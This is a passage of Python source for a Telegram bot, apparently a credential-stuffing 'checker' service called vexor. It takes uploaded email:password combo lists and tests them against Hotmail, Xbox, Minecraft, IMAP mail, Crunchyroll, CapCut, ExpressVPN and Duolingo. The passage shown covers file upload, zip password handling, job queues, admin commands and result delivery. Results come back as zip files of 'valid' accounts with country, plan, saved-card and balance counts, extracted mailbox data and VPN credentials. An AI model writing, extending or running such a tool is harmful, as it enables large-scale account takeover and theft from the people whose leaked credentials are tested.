    if job.mode == "duolingo":
      extra_notes += (
          "\n  • <code>family_invites.txt</code> & <code>plans/</code>"
      )
    if job.mode == "express":
      extra_notes += (
          "\n  • <code>licenses.txt</code> & <code>ovpn_credentials.txt</code>"
          "\n  • <code>plans/</code> — by billing cycle"
      )
    if job.mode in ("capcut", "cupcut"):
      extra_notes += (
          "\n  • <code>capcut_hits.txt</code>"
          "\n  • <code>plans/</code> & <code>countries/</code>"
      )

    total_chunks = len(chunks)
    for _idx, (buf, i, n, cnt) in enumerate(chunks, 1):
      suffix = f" ({i}/{n})" if n > 1 else ""
      fname = f"checker_{i}of{n}.zip" if n > 1 else "checker.zip"
      caption = (
          f"{pe('✅')} <b>{cnt} valid{suffix}</b> — {pe(mode_emoji(job.mode))}"
          f" {job.mode_label}\n"
          f"{pe('📄')} Source: <code>{esc_html(job.file_label)}</code>\n"
          f"{pe('📦')} <code>{fname}</code>:\n"
          f"  • <code>FULL.txt</code> (Account | Country | Plan)\n"
          f"  • <code>countries/</code> (Per-country files)\n"
          f"  • <code>valid.txt</code> & <code>domains/</code>{extra_notes}\n"
          f"{pe('⚠️')} <i>Save this file — it won't be resent</i>"
      )
      sent = False
      for attempt in range(3):
        r = bot.api.send_zip(
            job.chat_id, buf, filename=fname, caption=caption
        )
        if r.get("ok"):
          sent = True
          break
        time.sleep(2 * (attempt + 1))
      if not sent:
        bot.api.send_rich(
            job.chat_id,
            f"{pe('⚠️')} <b>Chunk {i}/{n} failed to send.</b>\n"
            "Use /stats to view counters.",
        )
      if i == total_chunks and not has_q:
        bot.api.send_rich(
            job.chat_id, f"{pe('🎉')} <b>Done.</b>", main_menu_kb()
        )
  else:
    bot.api.send_rich(
        job.chat_id,
        f"{pe('🌐')} <b>No valid accounts found.</b>\n"
        f"{pe('📄')} File: <code>{esc_html(job.file_label)}</code>\n\n"
        f"<blockquote>"
        f"{pe('📊')} Checked: <code>{job.total}</code>\n"
        f"{pe('❌')} Bad: <code>{job.bad}</code>  "
        f"{pe('🔐')} 2FA: <code>{job.twofa}</code>  "
        f"{pe('🌐')} Net: <code>{job.net}</code>"
        f"</blockquote>",
        main_menu_kb(has_queue=has_q),
    )

  _notify_admin_done(bot, job)
  with job.lock:
    job.valid_list.clear()
    if hasattr(job, "free_list"): job.free_list.clear()


def _notify_admin_new_job(bot, job, user):
  if job.chat_id == config.ADMIN_ID:
    return
  name = user.get("first_name", "User")
  handle = (
      f"@{user['username']}"
      if user.get("username")
      else f"<code>{user.get('id', job.chat_id)}</code>"
  )
  try:
    bot.api.send_rich(
        config.ADMIN_ID,
        f"{pe('🚀')} <b>New Check</b>\n"
        f"{pe('👤')} <b>{esc_html(name)}</b> {handle}\n"
        f"{pe('📌')} <code>{job.chat_id}</code>\n"
        f"{pe('📄')} <code>{esc_html(job.file_label)}</code>\n"
        f"{pe('🎯')} {job.mode_label} | {pe('📊')} {job.total}",
    )
  except Exception:
    pass


def _notify_admin_done(bot, job):
  if job.chat_id == config.ADMIN_ID:
    return
  elapsed = (
      int((job.end_time or time.time()) - job.start_time)
      + job.elapsed_before_pause
  )
  warn = (
      f"\n{pe('⚠️')} <b>100% valid — suspicious.</b>"
      if (job.total >= 10 and job.valid == job.total)
      else ""
  )
  retry_line = (
      f"{pe('🔄')} Retried: <code>{job.retried}</code>  "
      f"Rec: <code>{job.recovered}</code>\n"
      if job.retried > 0
      else ""
  )
  extra = ""
  if job.mode == "xbox":
    extra = (
        f"{pe('🎮')} GP: <code>{job.gamepass}</code>  "
        f"{pe('⛏')} MC: <code>{job.minecraft}</code>  "
        f"{pe('💳')} CC: <code>{job.with_cards}</code>  "
        f"{pe('💰')} Bal: <code>{job.with_balance}</code>\n"
    )
  elif job.mode in ("inbox", "imap", "full"):
    extra = f"{pe('📦')} Extracted: <code>{job.extracted}</code>\n"
  elif job.mode == "minecraft":
    extra = f"{pe('⛏')} MC: <code>{job.minecraft}</code>\n"
  try:
    bot.api.send_rich(
        config.ADMIN_ID,
        f"{pe('✅')} <b>Check Done</b>\n"
        f"{pe('📌')} <code>{job.chat_id}</code>  {pe('🎯')} {job.mode_label}\n"
        f"{pe('📄')} <code>{esc_html(job.file_label)}</code>\n"
        f"{pe('✅')} Valid: <b>{job.valid}</b>/{job.total}\n"
        f"{extra}"
        f"{pe('❌')} Bad: <code>{job.bad}</code>  "
        f"{pe('🔐')} 2FA: <code>{job.twofa}</code>\n"
        f"{retry_line}"
        f"{pe('⏱')} <code>{elapsed}s</code>{warn}",
    )
  except Exception:
    pass


def _notify_admin_error(bot, job, tb):
  try:
    bot.api.send_rich(
        config.ADMIN_ID,
        f"{pe('⚠️')} <b>Crashed</b>\n{pe('📌')} <code>{job.chat_id}</code>\n"
        f"<pre>{esc_html(tb[:3000])}</pre>",
    )
  except Exception:
    pass


# ═══════════════════ DOCUMENT HANDLING & MULTI-FILE QUEUE ═══════════════════
def on_document(bot, msg):
  chat_id = msg["chat"]["id"]
  doc = msg["document"]
  orig_name = doc.get("file_name") or "combos.txt"
  fname = orig_name.lower()

  if not is_allowed(chat_id):
    bot.api.send_rich(
        chat_id,
        f"{pe('🛑')} <b>Access Denied</b>\n"
        f"🆔 Your ID: <code>{chat_id}</code>\n"
        "<i>Send this ID to the admin to request access.</i>",
    )
    return

  with bot.pending_lock:
    if chat_id in bot.pending_zip:
      bot.api.send_rich(
          chat_id, f"{pe('⏳')} <b>Enter the password for your previous ZIP first.</b>"
      )
      return

  with bot.queue_lock:
    q_len = len(bot.job_queues.get(chat_id, []))
  if q_len >= config.MAX_QUEUE_PER_USER:
    bot.api.send_rich(
        chat_id,
        f"{pe('⚠️')} <b>Queue full ({config.MAX_QUEUE_PER_USER} files max).</b>\n"
        "Wait for current jobs to finish or use /clearqueue.",
    )
    return

  if not (fname.endswith(".txt") or fname.endswith(".zip")):
    bot.api.send_rich(chat_id, f"{pe('❌')} <b>Only .txt or .zip.</b>")
    return
  if doc.get("file_size", 0) > config.MAX_FILE_SIZE_MB * 1024 * 1024:
    bot.api.send_rich(
        chat_id, f"{pe('❌')} <b>Max {config.MAX_FILE_SIZE_MB} MB.</b>"
    )
    return

  status_resp = bot.api.send_rich(
      chat_id,
      f"{pe('🔄')} <b>Downloading</b> <code>{esc_html(orig_name)}</code>…",
  )
  status_mid = status_resp.get("result", {}).get("message_id")

  tmp_dir = Path(tempfile.gettempdir()) / "vexor_bot"
  tmp_dir.mkdir(exist_ok=True)
  ext = ".zip" if fname.endswith(".zip") else ".txt"
  unique_tag = f"{chat_id}_{int(time.time()*1000)}_{gen_session_id()[:4]}"
  save_path = tmp_dir / f"{unique_tag}{ext}"

  if not bot.api.download(doc["file_id"], save_path):
    bot.api.edit_rich(chat_id, status_mid, f"{pe('❌')} <b>Download failed.</b>")
    return

  if fname.endswith(".zip"):
    try:
      handle_zip_upload(
          bot, chat_id, save_path, status_mid, file_label=orig_name
      )
    except Exception as e:
      log("zip", f"handler: {e}", level="ERROR")
      try:
        save_path.unlink(missing_ok=True)
      except Exception:
        pass
      bot.api.edit_rich(
          chat_id,
          status_mid,
          f"{pe('❌')} <b>ZIP failed:</b> {esc_html(str(e))}",
      )
    return

  try:
    combos, junk, dup = load_combos(save_path)
  finally:
    try:
      save_path.unlink(missing_ok=True)
    except Exception:
      pass
  prompt_mode(
      bot, chat_id, combos, junk, dup, status_mid, file_label=orig_name
  )


def handle_zip_upload(
    bot,
    chat_id,
    zip_path,
    status_mid,
    password=None,
    attempts_left=None,
    file_label="combos.zip",
):
  if attempts_left is None:
    attempts_left = config.MAX_PW_ATTEMPTS
  if attempts_left <= 0:
    bot.api.edit_rich(chat_id, status_mid, f"{pe('❌')} <b>Too many attempts.</b>")
    try:
      zip_path.unlink(missing_ok=True)
    except Exception:
      pass
    return

  extract_dir = (
      Path(tempfile.gettempdir())
      / f"vexor_zip_{chat_id}_{int(time.time()*1000)}"
  )
  text_files, err = safe_extract_zip(zip_path, extract_dir, password)

  if err in ("PASSWORD_REQUIRED", "BAD_PASSWORD"):
    with bot.pending_lock:
      bot.pending_zip[chat_id] = {
          "zip_path": str(zip_path),
          "msg_id": status_mid,
          "extract_dir": str(extract_dir),
          "attempts_left": attempts_left - 1,
          "file_label": file_label,
          "expires_at": time.time() + config.PENDING_ZIP_TTL,
      }
    msg = (
        f"{pe('🔐')} <b>ZIP is password-protected.</b>\n"
        f"Send password. Left: <b>{attempts_left - 1}</b>"
        if err == "PASSWORD_REQUIRED"
        else (
            f"{pe('❌')} <b>Wrong password.</b>\nLeft:"
            f" <b>{attempts_left - 1}</b>"
        )
    )
    bot.api.edit_rich(chat_id, status_mid, msg)
    return

  if err:
    bot.api.edit_rich(
        chat_id, status_mid, f"{pe('❌')} <b>ZIP error:</b> {esc_html(err)}"
    )
    try:
      zip_path.unlink(missing_ok=True)
    except Exception:
      pass
    try:
      shutil.rmtree(extract_dir, ignore_errors=True)
    except Exception:
      pass
    return

  all_combos, seen = [], set()
  total_junk = 0
  total_dup = 0
  for tf in text_files:
    combos, j_cnt, d_cnt = load_combos(tf)
    total_junk += j_cnt
    total_dup += d_cnt
    for e, pw, meta in combos:
      key = (e.lower(), pw)
      if key not in seen:
        seen.add(key)
        all_combos.append((e, pw, meta))
      else:
        total_dup += 1
    try:
      tf.unlink(missing_ok=True)
    except Exception:
      pass
  try:
    zip_path.unlink(missing_ok=True)
  except Exception:
    pass
  try:
    shutil.rmtree(extract_dir, ignore_errors=True)
  except Exception:
    pass

  if not all_combos:
    bot.api.edit_rich(
        chat_id, status_mid, f"{pe('❌')} <b>No combos in ZIP.</b>"
    )
    return
  prompt_mode(
      bot,
      chat_id,
      all_combos,
      total_junk,
      total_dup,
      status_mid,
      file_label=file_label,
  )


def prompt_mode(
    bot, chat_id, combos, junk, dup, status_mid, file_label="combos.txt"
):
  if not combos:
    bot.api.edit_rich(chat_id, status_mid, f"{pe('❌')} <b>No combos.</b>")
    return

  bid = gen_session_id()[:6]
  with bot.pending_check_lock:
    user_batches = bot.pending_check.setdefault(chat_id, {})
    user_batches[bid] = {
        "bid": bid,
        "combos": combos,
        "junk": junk,
        "dup": dup,
        "file_label": file_label,
        "msg_id": status_mid,
        "expires_at": time.time() + config.PENDING_CHECK_TTL,
    }

  with bot.active_lock:
    is_busy = chat_id in bot.active

  preview = [f"<code>{e}:{_mask_pw(pw)}</code>" for e, pw, _ in combos[:3]]
  bot.api.edit_rich(
      chat_id,
      status_mid,
      mode_prompt_html(
          len(combos), junk, dup, preview, file_label=file_label, is_busy=is_busy
      ),
      mode_select_kb(bid=bid),
  )


def start_or_queue_check(
    bot,
    chat_id,
    combos,
    junk,
    dup,
    status_mid,
    mode="hotmail",
    file_label="combos.txt",
):
  """Start the check immediately if user has no active job, or place it in the persistent queue."""
  if not combos:
    bot.api.edit_rich(chat_id, status_mid, f"{pe('❌')} <b>No combos.</b>")
    return

  if len(combos) > config.MAX_COMBOS_PER_CHECK:
    bot.api.edit_rich(
        chat_id,
        status_mid,
        f"{pe('❌')} <b>Too many combos.</b>\n"
        f"Max: <code>{config.MAX_COMBOS_PER_CHECK:,}</code>\n"
        f"Got: <code>{len(combos):,}</code>",
    )
    return

  with bot.active_lock:
    if chat_id in bot.active:
      is_running = True
    else:
      job = CheckJob(chat_id, combos, mode=mode, file_label=file_label)
      job.status_msg_id = status_mid
      bot.active[chat_id] = job
      is_running = False

  if is_running:
    with bot.queue_lock:
      q = bot.job_queues.setdefault(chat_id, [])
      q.append({
          "combos": combos,
          "junk": junk,
          "dup": dup,
          "mode": mode,
          "file_label": file_label,
          "queued_at": time.time(),
      })
      pos = len(q)
      save_user_queue(chat_id, q)

    log(
        "queue",
        f"Queued file '{file_label}' ({len(combos)} combos, mode={mode}) for chat={chat_id} at pos #{pos}",
        level="INFO",
    )
    bot.api.edit_rich(
        chat_id,
        status_mid,
        f"{pe('⏳')} <b>Added to Queue (#{pos})</b>\n"
        f"<pre>vexor • auto-queue</pre>\n\n"
        f"<blockquote>"
        f"{pe('📄')} File: <code>{esc_html(file_label)}</code>\n"
        f"{pe('🎯')} Mode: <b>{config.MODE_LABELS.get(mode, mode)}</b>\n"
        f"{pe('📊')} Combos: <code>{len(combos)}</code>\n"
        f"{pe('📋')} Position: <b>#{pos} in queue</b>"
        f"</blockquote>\n"
        f"{pe('✨')} <i>Will start automatically as soon as the current scan finishes!</i>\n"
        "Use <code>/queue</code> to view or <code>/clearqueue</code> to clear.",
        main_menu_kb(show_cancel=True, has_queue=True),
    )
    return

  clear_job_state(chat_id)

  if job.imap_mode:
    threads_info = f"{config.IMAP_THREADS} IMAP"
  elif job.xbox_mode or job.minecraft_mode:
    threads_info = f"{config.XBOX_THREADS} Xbox"
  elif job.mode == "crunchyroll":
    threads_info = f"{getattr(config, 'CRUNCHY_THREADS', 25)} Crunchyroll"
  elif job.mode in ("capcut", "cupcut"):
    threads_info = f"{getattr(config, 'CAPCUT_THREADS', 30)} CapCut"
  elif job.full_mode or job.inbox_mode:
    threads_info = f"{config.THREADS} login + {config.EXTRACT_THREADS} extract"
  else:
    threads_info = f"{config.THREADS} login"

  summary = (
      f"{pe('🚀')} <b>Starting check</b>\n"
      f"<pre>vexor • launching</pre>\n\n"
      f"<blockquote>"
      f"{pe('📄')} File: <code>{esc_html(file_label)}</code>\n"
      f"{pe('🎯')} Mode: {job.mode_label}\n"
      f"{pe('📊')} Combos: <code>{len(combos)}</code>\n"
      f"{pe('⚡')} Threads: <code>{threads_info}</code>"
      f"</blockquote>\n"
      f"{pe('🔥')} <i>Running…</i>  |  /cancel  |  /status"
  )
  bot.api.edit_rich(chat_id, status_mid, summary)

  threading.Thread(target=_run_job, args=(bot, job), daemon=True).start()

  with bot.usernames_lock:
    uentry = bot.usernames.get(chat_id, {})
    first_name = uentry.get("name", "User")
    uname = uentry.get("uname", "")

  _notify_admin_new_job(
      bot,
      job,
      {
          "first_name": first_name,
          "username": uname,
          "id": chat_id,
      },
  )


def on_text_password(bot, msg):
  chat_id = msg["chat"]["id"]
  text = (msg.get("text") or "").strip()
  with bot.pending_lock:
    pending = bot.pending_zip.pop(chat_id, None)
  if not pending:
    return False
  if pending.get("expires_at", 0) < time.time():
    try:
      Path(pending["zip_path"]).unlink(missing_ok=True)
    except Exception:
      pass
    bot.api.edit_rich(chat_id, pending["msg_id"], f"{pe('❌')} <b>Expired.</b>")
    return True
  zip_path = Path(pending["zip_path"])
  msg_id = pending["msg_id"]
  attempts = pending.get("attempts_left", 0)
  file_label = pending.get("file_label", "combos.zip")
  if not zip_path.exists():
    bot.api.edit_rich(chat_id, msg_id, f"{pe('❌')} <b>ZIP gone.</b>")
    return True
  handle_zip_upload(
      bot,
      chat_id,
      zip_path,
      msg_id,
      password=text,
      attempts_left=attempts,
      file_label=file_label,
  )
  return True


# ═══════════════════ MESSAGE DISPATCH ═══════════════════
def handle_message(bot, msg):
  chat_id = msg["chat"]["id"]
  if msg["chat"].get("type") != "private":
    return
  text = (msg.get("text") or "").strip()

  if "from" in msg:
    name = msg.get("from", {}).get("first_name")
    uname = msg.get("from", {}).get("username")
    with bot.usernames_lock:
      entry = bot.usernames.setdefault(chat_id, {})
      if name:
        entry["name"] = name
      if uname:
        entry["uname"] = uname
    if name:
      config.save_username(chat_id, name, uname)

  with bot.pending_lock:
    has_pending = chat_id in bot.pending_zip
  if has_pending and text and not text.startswith("/"):
    if on_text_password(bot, msg):
      return

  cmd = text.split()[0].lower().split("@")[0] if text else ""

  if cmd == "/start":
    cmd_start(bot, msg)
  elif cmd == "/myid":
    bot.api.send_rich(
        chat_id, f"{pe('👤')} <b>Your Telegram ID:</b> <code>{chat_id}</code>"
    )
  elif cmd == "/help":
    bot.api.send_rich(chat_id, help_html(), main_menu_kb())
  elif cmd == "/cancel":
    cmd_cancel(bot, msg)
  elif cmd == "/queue":
    cmd_queue(bot, msg)
  elif cmd == "/clearqueue":
    cmd_clearqueue(bot, msg)
  elif cmd == "/stats":
    cmd_stats(bot, msg)
  elif cmd == "/status":
    cmd_status(bot, msg)
  elif cmd == "/allow":
    admin.cmd_allow(bot, msg)
  elif cmd == "/deny":
    admin.cmd_deny(bot, msg)
  elif cmd == "/ban" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_ban(bot, msg)
  elif cmd == "/unban" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_unban(bot, msg)
  elif cmd == "/listusers":
    admin.cmd_listusers(bot, msg)
  elif cmd == "/listbanned" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_listbanned(bot, msg)
  elif cmd == "/broadcast":
    if msg.get("from", {}).get("id") != config.ADMIN_ID:
      bot.api.send_rich(chat_id, f"{pe('🛑')} <b>Admin only.</b>")
      return
    admin.cmd_broadcast(bot, msg)
  elif cmd == "/userstats" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_userstats(bot, msg)
  elif cmd == "/stopall" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    with bot.active_lock:
      count = len(bot.active)
      for j in bot.active.values():
        j.cancelled = True
    with bot.queue_lock:
      q_count = sum(len(q) for q in bot.job_queues.values())
      for cid in list(bot.job_queues.keys()):
        bot.job_queues[cid].clear()
        save_user_queue(cid, [])
    bot.api.send_rich(
        chat_id,
        f"{pe('🛑')} <b>Cancelled {count} active job(s) and cleared {q_count} queued file(s).</b>",
    )
  elif cmd == "/killjob" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_killjob(bot, msg)
  elif cmd == "/logs" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_logs(bot, msg)
  elif cmd == "/proxies" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    admin.cmd_proxies(bot, msg)
  elif cmd == "/ping" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    _t0 = time.time()
    _rr = bot.api.send_rich(chat_id, f"{pe('⚡')} …")
    _ms = int((time.time() - _t0) * 1000)
    _mid = _rr.get("result", {}).get("message_id")
    bot.api.edit_rich(
        chat_id,
        _mid,
        f"{pe('⚡')} <b>Pong!</b> <code>{_ms}ms</code>  "
        f"{pe('🔄')} API <code>OK</code>",
    )
  elif cmd == "/admin" and msg.get("from", {}).get("id") == config.ADMIN_ID:
    with bot.active_lock:
      _active_count = len(bot.active)
    with bot.queue_lock:
      _queued_count = sum(len(q) for q in bot.job_queues.values())
    _user_count = len(list_allowed())
    _banned_count = len(list_banned())
    bot.api.send_rich(
        chat_id,
        f"{pe('🤵')} <b>Admin Panel</b>\n"
        f"<pre>vexor • admin</pre>\n\n"
        f"<blockquote>"
        f"{pe('👥')} Users: <code>{_user_count}</code>  "
        f"{pe('🔄')} Active: <code>{_active_count}</code>\n"
        f"{pe('📋')} Queued: <code>{_queued_count}</code>  "
        f"{pe('🛑')} Banned: <code>{_banned_count}</code>"
        f"</blockquote>",
        admin_menu_kb(),
    )
  elif "document" in msg:
    on_document(bot, msg)
  else:
    if is_allowed(chat_id):
      bot.api.send_rich(
          chat_id, f"{pe('📤')} <b>Send .txt or .zip.</b>", main_menu_kb()
      )
    else:
      bot.api.send_rich(
          chat_id,
          f"{pe('🛑')} <b>Access Denied</b>\n"
          f"🆔 Your ID: <code>{chat_id}</code>\n"
          "<i>Contact admin to request access.</i>",
      )


def cmd_queue(bot, msg):
  chat_id = msg["chat"]["id"]
  if not is_allowed(chat_id):
    return
  with bot.queue_lock:
    q = list(bot.job_queues.get(chat_id, []))
  with bot.active_lock:
    has_active = chat_id in bot.active
  if not q:
    bot.api.send_rich(
        chat_id,
        f"{pe('📋')} <b>Your queue is empty.</b>\n"
        "Send multiple combo files anytime to queue them!",
        main_menu_kb(show_cancel=has_active),
    )
    return
  lines = []
  for idx, item in enumerate(q, 1):
    m_lbl = config.MODE_LABELS.get(item["mode"], item["mode"])
    lines.append(
        f"<b>#{idx}</b> • <code>{esc_html(item.get('file_label', 'combos.txt'))}</code> "
        f"— {m_lbl} (<code>{len(item['combos'])}</code> combos)"
    )
  bot.api.send_rich(
      chat_id,
      f"{pe('📋')} <b>Queued Files ({len(q)})</b>\n"
      f"<pre>vexor • auto-queue</pre>\n\n"
      f"<blockquote>" + "\n".join(lines) + "</blockquote>\n"
      "Use <code>/clearqueue</code> to remove all waiting files.",
      main_menu_kb(show_cancel=has_active, has_queue=True),
  )


def cmd_clearqueue(bot, msg):
  chat_id = msg["chat"]["id"]
  with bot.queue_lock:
    q = bot.job_queues.get(chat_id, [])
    cnt = len(q)
    q.clear()
    save_user_queue(chat_id, [])
  bot.api.send_rich(
      chat_id,
      f"{pe('🛑')} <b>Cleared {cnt} file(s) from your queue.</b>",
      main_menu_kb(),
  )


def cmd_stats(bot, msg):
  chat_id = msg["chat"]["id"]
  if not is_allowed(chat_id):
    bot.api.send_rich(chat_id, f"{pe('🛑')} <b>Access denied.</b>")
    return
  agg_line = _build_agg_line(chat_id)
  with bot.active_lock:
    active_job = bot.active.get(chat_id)
    last_job = bot.last_jobs.get(chat_id)
  q_cnt = _get_queued_count(bot, chat_id)
  if active_job:
    bot.api.send_rich(
        chat_id,
        agg_line + job_status_html(active_job, queued_count=q_cnt),
        job_status_kb(has_queue=(q_cnt > 0)),
    )
  elif (
      last_job
      and last_job.end_time
      and time.time() - last_job.end_time < config.LAST_JOB_RETENTION
  ):
    bot.api.send_rich(
        chat_id,
        agg_line + job_final_html(last_job),
        main_menu_kb(has_queue=(q_cnt > 0)),
    )
  else:
    bot.api.send_rich(
        chat_id,
        agg_line + f"{pe('📊')} <b>No recent jobs.</b>",
        main_menu_kb(has_queue=(q_cnt > 0)),
    )


def cmd_start(bot, msg):
  chat_id = msg["chat"]["id"]
  name = msg.get("from", {}).get("first_name", "there")
  uname = msg.get("from", {}).get("username")
  is_admin = msg.get("from", {}).get("id") == config.ADMIN_ID
  with bot.usernames_lock:
    bot.usernames.setdefault(chat_id, {})["name"] = name
    if uname:
      bot.usernames[chat_id]["uname"] = uname
  config.save_username(chat_id, name, uname)
  if not is_allowed(chat_id):
    bot.api.send_rich(
        chat_id,
        f"{pe('🛑')} <b>Access Denied</b>\n"
        f"🆔 Your ID: <code>{chat_id}</code>\n"
        "<i>Contact admin to request access.</i>",
    )
    return
  bot.api.clear_reply_keyboard(chat_id)
  has_q = _get_queued_count(bot, chat_id) > 0
  with bot.active_lock:
    has_active = chat_id in bot.active
  bot.api.send_rich(
      chat_id,
      welcome_html(name, is_admin=is_admin),
      main_menu_kb(show_cancel=has_active, has_queue=has_q),
  )


def cmd_cancel(bot, msg):
  chat_id = msg["chat"]["id"]
  with bot.active_lock:
    job = bot.active.get(chat_id)
  if job:
    q_cnt = _get_queued_count(bot, chat_id)
    q_note = (
        f"\n{pe('📋')} <i>Next queued file ({q_cnt} waiting) will start automatically. Use /clearqueue to stop all.</i>"
        if q_cnt > 0
        else ""
    )
    if job.cancelled:
      bot.api.send_rich(
          chat_id,
          f"{pe('⏳')} <b>Already cancelling…</b>{q_note}",
          sub_menu_kb(),
      )
    else:
      job.cancelled = True
      bot.api.send_rich(
          chat_id,
          f"{pe('🛑')} <b>Cancelling current job…</b>{q_note}",
          sub_menu_kb(),
      )
    return

  with bot.pending_check_lock:
    batches = bot.pending_check.pop(chat_id, None)
  if batches:
    bot.api.send_rich(
        chat_id,
        f"{pe('❌')} <b>Cleared {len(batches)} pending file selection(s).</b>",
        sub_menu_kb(),
    )
    return

  with bot.pending_lock:
    pending = bot.pending_zip.pop(chat_id, None)
  if pending:
    try:
      Path(pending["zip_path"]).unlink(missing_ok=True)
    except Exception:
      pass
    try:
      shutil.rmtree(pending.get("extract_dir", ""), ignore_errors=True)
    except Exception:
      pass
    bot.api.send_rich(chat_id, f"{pe('🛑')} <b>ZIP cancelled.</b>")
    return

  with bot.active_lock:
    last = bot.last_jobs.get(chat_id)
  if (
      last
      and last.end_time
      and time.time() - last.end_time < config.LAST_JOB_RETENTION
  ):
    bot.api.send_rich(
        chat_id,
        f"{pe('📊')} <b>No active job.</b>\nLast job:\n{job_final_html(last)}",
        main_menu_kb(),
    )
  else:
    bot.api.send_rich(
        chat_id, f"{pe('💡')} <b>Nothing to cancel.</b>", main_menu_kb()
    )


def cmd_status(bot, msg):
  chat_id = msg["chat"]["id"]
  with bot.active_lock:
    job = bot.active.get(chat_id)
  q_cnt = _get_queued_count(bot, chat_id)
  if not job:
    bot.api.send_rich(
        chat_id,
        f"{pe('📊')} <b>No active job.</b>"
        + (f"\n{pe('📋')} Queued files: <code>{q_cnt}</code>" if q_cnt else ""),
        main_menu_kb(has_queue=(q_cnt > 0)),
    )
    return
  r = bot.api.send_rich(
      chat_id,
      job_status_html(job, queued_count=q_cnt),
      job_status_kb(has_queue=(q_cnt > 0)),
  )
  mid = r.get("result", {}).get("message_id")
  if mid:
    with job.lock:
      job.status_msg_id = mid


def _resolve_pending_batch(bot, chat_id, bid, msg_id, pop=False):
  """Find the uploaded file batch matching `bid` (or fallback to msg_id / latest)."""
  with bot.pending_check_lock:
    user_batches = bot.pending_check.get(chat_id) or {}
    if not user_batches:
      return None
    target_key = None
    if bid and bid in user_batches:
      target_key = bid
    else:
      for k, v in user_batches.items():
        if v.get("msg_id") == msg_id:
          target_key = k
          break
      if not target_key and len(user_batches) == 1:
        target_key = next(iter(user_batches.keys()))
    if not target_key:
      return None
    return user_batches.pop(target_key, None) if pop else user_batches.get(target_key)


# ═══════════════════ CALLBACK DISPATCH ═══════════════════
def handle_callback(bot, cb):
  chat_id = cb.get("message", {}).get("chat", {}).get("id")
  msg_id = cb.get("message", {}).get("message_id")
  raw_data = cb.get("data", "")
  user_id = cb.get("from", {}).get("id")

  if ":" in raw_data and not raw_data.startswith("admin_"):
    base_data, bid = raw_data.split(":", 1)
  else:
    base_data, bid = raw_data, None

  if base_data in _FAST_CALLBACKS:
    bot.api.answer_callback(cb["id"])
  else:
    bot.api.answer_callback(cb["id"], text="⏳")

  try:
    if base_data == "menu_home":
      with bot.usernames_lock:
        name = bot.usernames.get(chat_id, {}).get("name", "there")
      with bot.active_lock:
        has_active = chat_id in bot.active
      has_q = _get_queued_count(bot, chat_id) > 0
      is_admin = user_id == config.ADMIN_ID
      bot.api.edit_rich(
          chat_id,
          msg_id,
          welcome_html(name, is_admin=is_admin),
          main_menu_kb(show_cancel=has_active, has_queue=has_q),
      )

    elif base_data == "menu_upload":
      result = bot.api.edit_rich(
          chat_id,
          msg_id,
          f"{pe('📤')} <b>Send one or multiple .txt / .zip files now.</b>",
          sub_menu_kb(),
      )
      if not result.get("ok"):
        bot.api.send_rich(
            chat_id,
            f"{pe('📤')} <b>Send one or multiple .txt / .zip files now.</b>",
            sub_menu_kb(),
        )

    elif base_data == "menu_stats":
      _show_stats(bot, chat_id, msg_id)

    elif base_data == "menu_help":
      result = bot.api.edit_rich(chat_id, msg_id, help_html(), sub_menu_kb())
      if not result.get("ok"):
        bot.api.send_rich(chat_id, help_html(), sub_menu_kb())

    elif base_data == "menu_cancel":
      with bot.active_lock:
        job = bot.active.get(chat_id)
      if job:
        q_cnt = _get_queued_count(bot, chat_id)
        q_note = (
            f"\n{pe('📋')} <i>{q_cnt} queued file(s) will start next.</i>"
            if q_cnt > 0
            else ""
        )
        if job.cancelled:
          bot.api.edit_rich(
              chat_id,
              msg_id,
              f"{pe('⏳')} <b>Already cancelling…</b>{q_note}",
              sub_menu_kb(),
          )
        else:
          job.cancelled = True
          bot.api.edit_rich(
              chat_id,
              msg_id,
              f"{pe('🛑')} <b>Cancelling current job…</b>{q_note}",
              sub_menu_kb(),
          )
      else:
        bot.api.edit_rich(
            chat_id, msg_id, f"{pe('📊')} <b>No active job.</b>", sub_menu_kb()
        )

    elif base_data == "queue_clear":
      with bot.queue_lock:
        q = bot.job_queues.get(chat_id, [])
        cnt = len(q)
        q.clear()
        save_user_queue(chat_id, [])
      with bot.active_lock:
        has_active = chat_id in bot.active
      bot.api.edit_rich(
          chat_id,
          msg_id,
          f"{pe('🛑')} <b>Cleared {cnt} queued file(s).</b>",
          main_menu_kb(show_cancel=has_active, has_queue=False),
      )

    elif base_data == "submenu_hotmail":
      info = _resolve_pending_batch(bot, chat_id, bid, msg_id, pop=False)
      if not info or info.get("expires_at", 0) < time.time():
        bot.api.edit_rich(
            chat_id,
            msg_id,
            f"{pe('❌')} <b>Session expired.</b>\nUpload the file again.",
            main_menu_kb(),
        )
        return
      bot.api.edit_rich(
          chat_id,
          msg_id,
          f"{pe('🔥')} <b>Select Hotmail Mode for</b> <code>{esc_html(info.get('file_label', 'combos.txt'))}</code>:",
          hotmail_submenu_kb(bid=info.get("bid")),
      )

    elif base_data == "submenu_back":
      info = _resolve_pending_batch(bot, chat_id, bid, msg_id, pop=False)
      if not info or info.get("expires_at", 0) < time.time():
        bot.api.edit_rich(
            chat_id,
            msg_id,
            f"{pe('❌')} <b>Session expired.</b>\nUpload the file again.",
            main_menu_kb(),
        )
        return
      with bot.active_lock:
        is_busy = chat_id in bot.active
      combos = info["combos"]
      preview = [f"<code>{e}:{_mask_pw(pw)}</code>" for e, pw, _ in combos[:3]]
      bot.api.edit_rich(
          chat_id,
          msg_id,
          mode_prompt_html(
              len(combos),
              info["junk"],
              info["dup"],
              preview,
              file_label=info.get("file_label", "combos.txt"),
              is_busy=is_busy,
          ),
          mode_select_kb(bid=info.get("bid")),
      )

    elif base_data in (
        "mode_hotmail",
        "mode_inbox",
        "mode_full",
        "mode_xbox",
        "mode_minecraft",
        "mode_imap",
        "mode_crunchyroll",
        "mode_capcut",
        "mode_express",
        "mode_duolingo",
    ):
      info = _resolve_pending_batch(bot, chat_id, bid, msg_id, pop=True)
      if not info or info.get("expires_at", 0) < time.time():
        bot.api.edit_rich(
            chat_id,
            msg_id,
